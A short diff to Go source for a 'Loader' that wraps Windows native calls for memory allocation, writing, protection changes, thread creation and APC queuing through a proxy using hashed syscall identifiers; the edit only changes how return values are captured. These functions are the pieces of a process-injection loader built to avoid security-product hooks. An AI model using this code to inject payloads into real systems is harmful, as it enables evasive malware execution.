@@ -11,7 +11,7 @@ func (l *Loader) NtAllocateVirtualMemory(
 	memSize int,
 	allocType, protectAttr uintptr,
 ) (uintptr, error) {
-	if err := l.callProxy.Syscall(
+	if _, err := l.callProxy.Syscall(
 		15141956341870172521,
 		hProc,              // ProcessHandle
 		ptr2ptr(&baseAddr), // BaseAddress
@@ -32,7 +32,7 @@ func (l *Loader) NtWriteVirtualMemory(
 	numBytesToWrite int,
 ) (uintptr, error) {
 	numOfBytesWritten := 0
-	if err := l.callProxy.Syscall(
+	if _, err := l.callProxy.Syscall(
 		11082677680923502116,
 		hProc,                       // ProcessHandle
 		baseAddr,                    // BaseAddress
@@ -57,7 +57,7 @@ func (l *Loader) NtProtectVirtualMemory(
 	newProtect uintptr,
 	oldProtect uintptr,
 ) (uintptr, error) {
-	if err := l.callProxy.Syscall(
+	if _, err := l.callProxy.Syscall(
 		8024050266839726481,
 		hProc,                // ProcessHandle
 		ptr2ptr(&baseAddr),   // BaseAddress
@@ -72,7 +72,7 @@ func (l *Loader) NtProtectVirtualMemory(
 }
 
 func (l *Loader) NtCreateThreadEx(hThread, hProc, baseAddr uintptr) (uintptr, error) {
-	if err := l.callProxy.Syscall(
+	if _, err := l.callProxy.Syscall(
 		12013194309262373545,
 		ptr2ptr(&hThread),       // ThreadHandle
 		windows.GENERIC_EXECUTE, // DesiredAccess
@@ -93,7 +93,7 @@ func (l *Loader) NtCreateThreadEx(hThread, hProc, baseAddr uintptr) (uintptr, er
 }
 
 func (l *Loader) NtQueueApcThread(hThread, baseAddr uintptr) (uintptr, error) {
-	if err := l.callProxy.Syscall(
+	if _, err := l.callProxy.Syscall(
 		14616308599774217599,
 		hThread,  // ThreadHandle
 		baseAddr, // ApcRoutine
